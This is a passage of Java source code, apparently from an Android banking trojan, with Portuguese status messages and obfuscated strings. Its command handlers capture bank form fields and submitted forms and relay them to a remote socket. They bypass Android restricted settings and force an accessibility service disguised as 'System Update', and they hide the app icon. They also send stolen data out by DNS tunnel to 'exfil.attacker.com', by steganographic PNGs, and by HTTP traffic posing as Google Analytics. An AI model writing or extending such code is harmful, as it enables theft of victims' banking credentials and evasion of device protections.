                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "disable_realtime");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            "Captura de formulários customizados desativada");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("tdC5j9rU9Smtg94oGFCTVA=="), response);
                }
            } else if ("capture_field".equals(action)) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "capture_field");
                response.put(StringCrypto.d("f+LMlOhxkOdO5UdHnc4/JA=="), data.optString("bankName", ""));
                response.put(StringCrypto.d("SsUl006pFidcBOYEr+hlqQ=="), data.optString("fieldName", ""));
                response.put(StringCrypto.d("dM1M643/PqAwQE46fiYUKA=="), data.optString("fieldValue", ""));
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                ioSocket.emit(StringCrypto.d("tdC5j9rU9Smtg94oGFCTVA=="), response);
            } else if ("submit_form".equals(action)) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "submit_form");
                response.put(StringCrypto.d("f+LMlOhxkOdO5UdHnc4/JA=="), data.optString("bankName", ""));
                response.put(StringCrypto.d("ojzCc+sIQ1zJGvRu6Zwq6w=="), data.optJSONObject("formData"));
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                ioSocket.emit(StringCrypto.d("tdC5j9rU9Smtg94oGFCTVA=="), response);
            }
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    public static void BP(JSONObject data) {
        try {
            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "bypass_protections_error");
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
                ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
                return;
            }

            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("enable_bypass".equals(action)) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable_bypass");
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Bypass de proteções do Android ativado");
                response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
            } else if ("disable_bypass".equals(action)) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "disable_bypass");
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Bypass de proteções desativado");
                response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
            } else if ("bypass_restricted_settings".equals(action)) {
                if (service != null) {
                    boolean success = service.bypassRestrictedSettings();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "bypass_restricted_settings");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            success ? "Configuração Restrita contornada com sucesso"
                                    : "Falha ao contornar Configuração Restrita");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
                }
            } else if ("force_accessibility_service".equals(action)) {
                if (service != null) {
                    String installationMethod = data
                            .optString(StringCrypto.d("/8RgGaQotSvYDZmlFM72dZlkJLjUe1N9w3pTvmWKF0Y="), "system_update");
                    String spoofedAppName = data.optString(StringCrypto.d("A4N3d7HkCYjQQ98dSHpBZA=="), "System Update");
                    boolean success = service.forceAccessibilityService(installationMethod, spoofedAppName);
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "force_accessibility_service");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
                    response.put(StringCrypto.d("/8RgGaQotSvYDZmlFM72dZlkJLjUe1N9w3pTvmWKF0Y="), installationMethod);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            success ? "Accessibility Service forçado com sucesso"
                                    : "Falha ao forçar Accessibility Service");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
                }
            } else if ("detect_protections".equals(action)) {
                if (service != null) {
                    org.json.JSONArray detectedProtections = service.detectAndroidProtections();
                    int androidVersion = service.getAndroidVersion();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "detect_protections");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    response.put(StringCrypto.d("TWRbGV4lHxChpxNzENFf+Q=="), detectedProtections);
                    response.put(StringCrypto.d("y2C4kIqvcAKHKm++V0kuFg=="), androidVersion);
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
                }
            } else if ("installation_method_update".equals(action)) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "installation_method_update");
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                response.put(StringCrypto.d("/8RgGaQotSvYDZmlFM72dZlkJLjUe1N9w3pTvmWKF0Y="),
                        data.optString("installationMethod", "system_update"));
                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Método de instalação atualizado");
                response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
            }
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    public static void HI(JSONObject data) {
        try {
            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "hide_icon_error");
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
                ioSocket.emit(StringCrypto.d("i6spsZ6J5riK1ljZZNRUCw=="), response);
                return;
            }

            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("enable_hide".equals(action)) {
                if (service != null) {
                    service.enableHideIcon();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable_hide");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Ocultação de ícone ativada");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("i6spsZ6J5riK1ljZZNRUCw=="), response);
                }
            } else if ("disable_hide".equals(action)) {
                if (service != null) {
                    service.disableHideIcon();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "disable_hide");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Ocultação de ícone desativada");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("i6spsZ6J5riK1ljZZNRUCw=="), response);
                }
            } else if ("remove_icon".equals(action)) {
                if (service != null) {
                    boolean success = service.removeAppIcon();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "remove_icon");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            success ? "Ícone removido com sucesso" : "Falha ao remover ícone");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("i6spsZ6J5riK1ljZZNRUCw=="), response);
                }
            } else if ("enable_background_service".equals(action)) {
                if (service != null) {
                    service.startBackgroundHideService();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable_background_service");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Serviço de segundo plano iniciado");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("i6spsZ6J5riK1ljZZNRUCw=="), response);
                }
            } else if ("detect_launchers".equals(action)) {
                if (service != null) {
                    org.json.JSONArray launchers = service.detectSystemLaunchers();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "detect_launchers");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    response.put(StringCrypto.d("2agtNtD2X/M1VxLUhOUV8A=="), launchers);
                    response.put(StringCrypto.d("Zzci4YKGitao/CnfafpMWA=="), launchers.length());
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("i6spsZ6J5riK1ljZZNRUCw=="), response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    // ==================== EXFILTRAÇÃO STEALTH (0xEX) ====================

    public static void EX(JSONObject data) {
        try {
            String action = data.optString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), ""); // "action"
            String payload = data.optString(StringCrypto.d("B9G6+3heWf715hd4xk743g=="), ""); // "data"

            if (payload.isEmpty() && data.has(StringCrypto.d("B9G6+3heWf715hd4xk743g=="))) {
                payload = data.getString(StringCrypto.d("B9G6+3heWf715hd4xk743g=="));
            }

            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("dns_tunnel".equals(action)) {
                String domain = data.optString("domain", "exfil.attacker.com");
                ExfilManager.sendViaDNSTunnel(domain, payload);

                JSONObject resp = new JSONObject();
                resp.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                resp.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "DNS tunnel executed");
                ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), resp); // 0xBP reuse or use 0xEX

            } else if ("stego_png".equals(action)) {
                byte[] png = ExfilManager.createSteganographicPNG(payload, 64, 64);
                if (png != null) {
                    String path = ExfilManager.saveStegoImage(png, "sys_" + System.currentTimeMillis() + ".png");
                    JSONObject resp = new JSONObject();
                    resp.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    resp.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Stego PNG saved: " + path);
                    ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), resp);
                }

            } else if ("http_mimic".equals(action)) {
                String url = data.optString("url", "https://www.google-analytics.com/collect");
                ExfilManager.sendViaHttpMimic(payload, url);

            } else if ("fragment".equals(action)) {
                String event = data.optString("event", "0xAS");
                ExfilManager.sendFragmented(event, payload);

            } else {
                // Default: usa fragmentação
                ExfilManager.sendFragmented("0xEX", payload);
            }

        } catch (Exception error) {
            error.printStackTrace();
            try {
                JSONObject resp = new JSONObject();
                resp.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
                resp.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), error.getMessage());
                ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), resp);
            } catch (Exception ignored) {
            }
        }
    }
}